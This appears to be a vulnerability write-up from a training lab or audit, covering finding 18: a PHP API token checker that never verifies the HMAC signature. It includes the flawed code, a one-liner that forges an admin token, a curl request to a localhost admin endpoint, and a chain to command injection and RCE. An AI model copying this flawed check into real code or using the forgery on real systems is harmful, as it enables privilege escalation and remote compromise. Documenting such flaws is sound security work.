# 18 — Forged API token (missing signature verification)

- **OWASP Top 10 (2021):** A01:2021 – Broken Access Control
- **Severity:** High
- **Difficulty:** Medium

## Where

`web/includes/auth.php:46-54` — `check_api_token()`:

```php
function check_api_token($token) {
    $parts = explode('.', $token);
    if (count($parts) != 2) return null;
    $raw = base64_decode($parts[0]);
    if ($raw === false) return null;
    $data = json_decode($raw, true);
    if (!$data) return null;
    return $data;                       // ← signature ($parts[1]) NEVER checked
}
```

Compare with the issuer (lines 40-44), which *does* compute an HMAC:

```php
$sig = base64_encode(hash_hmac('sha256', $payload, API_TOKEN_KEY, true));
return $payload . '.' . $sig;
```

## How it works (root cause)

Tokens are `base64(json).hmac`. The checker decodes and JSON-parses the
first part but **never compares the second part to a freshly computed
HMAC**. Any well-formed `base64(json).anything` is accepted, and the caller
trusts `admin`, `user`, `exp`, etc. straight from the attacker-controlled
JSON.

## Exploitation steps

1. Craft an admin token with no valid signature:

   ```bash
   PAYLOAD=$(python3 -c "import base64,json;print(base64.b64encode(json.dumps({'user':'admin','admin':1,'iat':0,'exp':9999999999}).encode()).decode())")
   TOKEN="$PAYLOAD.AAAA"          # signature part is arbitrary
   ```

   (`API_TOKEN_KEY` is not needed at all. If you did have it — it is readable
   via 10/11/13 — a "real" signature is equally easy, but unnecessary.)

2. Use it on an admin API:

   ```bash
   curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/v1/uplist/ -d "path=Z"
   ```

   The `admin != 1` gate in `uplist/index.php:19` is passed because the JSON
   says `admin:1`.

## Working PoC (verified)

```
Authorization: Bearer base64({"user":"admin","admin":1,"iat":0,"exp":9999999999}).AAAA
```

is accepted (no 401/403) and unlocks `/api/v1/uplist/` → command injection
(17) → RCE.

## Expected result / verification

- The API returns 200 (not 401/403) for a token with a garbage signature.
- An unauthenticated attacker now holds admin API privileges.
- ulla’s real `admin:0` token is rejected with `401 unauthorized`, while the
  forged `admin:1` token is accepted.

## Attack chain

```
forged admin token (no signature check)
  → admin API access
  → uplist command injection (17) → RCE
  → (also) any other admin-only API
```

## Notes

- The `exp` field is also never enforced by the checker, so "expired" forged
  tokens still work.
- This is the access-control flaw that makes 17 reachable without any real
  credential; 10/11/13 (reading `API_TOKEN_KEY`) are not even required.
